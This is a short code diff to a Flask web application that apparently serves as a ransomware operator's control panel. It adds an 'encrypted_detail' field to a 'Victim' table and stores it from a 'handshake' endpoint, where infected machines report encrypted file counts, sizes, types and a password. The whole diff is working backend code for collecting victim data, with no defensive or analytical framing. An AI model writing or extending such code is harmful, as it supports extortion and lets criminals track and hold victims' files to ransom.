@@ -61,6 +61,7 @@ class Victim(db.Model):
     encrypted_count = db.Column(db.Integer, default=0)
     encrypted_size = db.Column(db.BigInteger, default=0)
     encrypted_types = db.Column(db.Text, default='')
+    encrypted_detail = db.Column(db.Text, default='')
     created_at = db.Column(db.DateTime, default=datetime.datetime.utcnow)
 
 def login_required(f):
@@ -179,7 +180,8 @@ def handshake():
         password=request.form.get('password',''),
         encrypted_count=int(request.form.get('encrypted_count',0) or 0),
         encrypted_size=int(request.form.get('encrypted_size',0) or 0),
-        encrypted_types=request.form.get('encrypted_types',''))
+        encrypted_types=request.form.get('encrypted_types',''),
+        encrypted_detail=request.form.get('encrypted_detail',''))
     db.session.add(v); db.session.commit()
     return 'handshake completed'
 
